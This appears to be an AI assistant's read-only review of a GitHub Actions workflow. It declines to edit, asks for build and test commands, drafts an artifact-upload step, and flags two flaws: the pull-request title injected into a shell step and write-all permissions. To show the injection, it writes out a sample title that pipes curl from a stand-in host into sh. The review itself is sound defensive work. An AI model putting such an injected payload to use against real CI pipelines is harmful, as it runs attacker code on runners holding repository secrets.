I didn't change anything. I can only read files in this session, and the workflow isn't what the request assumes.

**What `.github/workflows/deploy.yml` contains:**

```yaml
on:
  pull_request:
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There's no build or test step, so there's no artifact to upload and nothing that "passes." I'd need to know:
1. What command builds the project and what command runs the tests?
2. Where does the build put its output (e.g. `dist/`, `build/`, a binary)?

**What the upload step would look like.** By default a step only runs if every step before it succeeded. So putting the upload right after the test step makes it run only when the tests pass:

```yaml
      - name: Test
        run: <your test command>
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: <build output path>
          if-no-files-found: error
```

Ideally, pin `actions/upload-artifact` to a full commit SHA instead of `@v4`.

**Two security problems in the existing file that you should fix whatever you decide:**
- **Line 14 lets anyone who opens a PR run commands.** It puts the PR title straight into the shell script. A title like `"; curl evil.sh | sh; #` runs as code on the runner. The fix is to pass the title through an environment variable:
  ```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **`permissions: write-all` is too broad.** It gives the job's token write access to the whole repository. Building, testing and uploading an artifact only needs `contents: read`.

If you send me the build and test commands and the output path, and either turn on file editing or tell me you'll apply it yourself, I'll write out the full corrected workflow.
